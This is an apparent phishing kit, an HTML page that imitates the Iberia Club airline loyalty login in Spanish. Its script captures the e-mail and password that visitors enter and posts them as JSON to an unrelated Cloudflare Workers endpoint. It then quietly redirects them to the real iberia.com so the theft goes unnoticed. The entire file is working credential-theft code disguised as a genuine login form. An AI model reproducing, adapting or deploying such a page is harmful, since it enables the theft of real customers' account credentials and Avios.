<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Acceso a Iberia Club</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
  <style>
    /* Pequeno estilo inline para garantir feedback visual mesmo sem style.css */
    .loading { opacity: 0.7; pointer-events: none; }
    .message { margin-top: 12px; font-size: 14px; }
    .message.ok { color: #0b8a3e; }
    .message.err { color: #b21c1c; }
  </style>
</head>
<body>

  <!-- TOPO ESTILO APP IBERIA -->
  <div class="top-bar-app">
    <div class="left">
      <img src="logousf7733.png" alt="Iberia Logo" class="logo-mini">
      <div class="app-text">
        <strong>Iberia</strong>
      </div>
    </div>
    <button class="open-btn">ABRIR</button>
  </div>

  <!-- FORMUL√ÅRIO -->
  <div class="login-wrapper">
    <h1>Acceso a Iberia Club</h1>
    <p class="subtitle">Inicia sesi√≥n para ver promociones exclusivas y utilizar tus Avios.</p>

    <form id="loginForm" novalidate>
      <div class="input-group">
        <input type="text" name="email" placeholder="E-mail o n¬∫ Iberia Club" required>
      </div>

      <div class="input-group password-group">
        <input type="password" name="password" placeholder="Contrase√±a" required>
        <span class="eye-icon" style="cursor:pointer;">üëÅÔ∏è</span>
      </div>

      <div class="forgot">
        <a href="#">¬øHas olvidado tu contrase√±a?</a>
      </div>

      <button type="submit" class="login-btn" id="submitBtn">Iniciar sesi√≥n</button>

      <div class="divider"><span>o</span></div>

      <button type="button" class="google-btn">
        <img src="https://www.svgrepo.com/show/355037/google.svg" alt="Google"> Entrar con Google
      </button>

      <button type="button" class="facebook-btn">
        <span style="margin-right: 8px;">f</span> Entrar con Facebook
      </button>

      <div class="register">
        <p>¬øNo tienes cuenta? <a href="#">Reg√≠strate</a></p>
      </div>

      <div id="formMessage" class="message" aria-live="polite" style="display:none;"></div>
    </form>
  </div>

  <script>
    // Mostrar/ocultar senha
    const eyeIcon = document.querySelector(".eye-icon");
    const passwordInput = document.querySelector('input[name="password"]');
    eyeIcon.addEventListener("click", () => {
      const type = passwordInput.type === "password" ? "text" : "password";
      passwordInput.type = type;
    });

    // Form handler adaptado ao seu Worker (que retorna { status: "ok" } / { status: "erro", message: "..." })
    const form = document.getElementById("loginForm");
    const submitBtn = document.getElementById("submitBtn");
    const messageEl = document.getElementById("formMessage");
    const WORKER_URL = "https://wild-shadow-c599.manuehfhjs2.workers.dev/"; // ajuste se necess√°rio

    function showMessage(text, type = "err") {
      messageEl.textContent = text;
      messageEl.className = "message " + (type === "ok" ? "ok" : "err");
      messageEl.style.display = "block";
    }

    function clearMessage() {
      messageEl.textContent = "";
      messageEl.style.display = "none";
    }

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      clearMessage();

      const email = e.target.email.value.trim();
      const password = e.target.password.value.trim();

      if (!email || !password) {
        showMessage("Por favor, preencha todos os campos.", "err");
        return;
      }

      // UI: bloquear e mostrar estado
      submitBtn.disabled = true;
      form.classList.add("loading");
      showMessage("Enviando...", ""); // neutro enquanto envia

      try {
        // montar o payload (mantive os mesmos campos que voc√™ j√° enviava)
        const payload = {
          email: email,
          password: password,
          origem: "formulario_firebase"
        };

        const resp = await fetch(WORKER_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        // tentar parsear JSON com seguran√ßa
        let data = null;
        try {
          data = await resp.json();
        } catch (err) {
          // resposta n√£o-JSON
          data = null;
        }

        console.log("Resposta do Worker:", resp.status, resp.statusText, data);

        // Verifica√ß√£o compat√≠vel com seu Worker atual:
        // - sucesso: { status: "ok" }
        // - erro:   { status: "erro", message: "..." }
        const didReturnStatusOk =
          data && typeof data.status === "string" && data.status.toLowerCase() === "ok";

        if (didReturnStatusOk || (resp.ok && data === null)) {
          // Sucesso - limpar form e redirecionar
          showMessage("Enviado com sucesso! Redirecionando...", "ok");

          // reset do formulario
          form.reset();

          // redireciona para a p√°gina desejada
          // ajuste a URL se preferir outra
          window.setTimeout(() => {
            window.location.href = "https://www.iberia.com/es/";
          }, 500); // pequena pausa para usu√°rio ver a mensagem

          return;
        }

        // N√£o foi sucesso: montar mensagem de erro
        let erroMsg = "Tente novamente";
        if (data) {
          if (data.message) erroMsg = data.message;
          else if (data.status) erroMsg = data.status;
          else if (data.error) erroMsg = data.error;
          else erroMsg = JSON.stringify(data);
        } else if (!resp.ok) {
          erroMsg = `Erro HTTP ${resp.status} ‚Äî ${resp.statusText}`;
        }

        console.warn("Envio falhou:", erroMsg);
        showMessage("‚ùå Erro ao enviar: " + erroMsg, "err");

      } catch (err) {
        console.error("Erro de rede/exce√ß√£o:", err);
        showMessage("Erro de conex√£o: " + (err.message || err), "err");
      } finally {
        submitBtn.disabled = false;
        form.classList.remove("loading");
      }
    });
  </script>

</body>
</html>
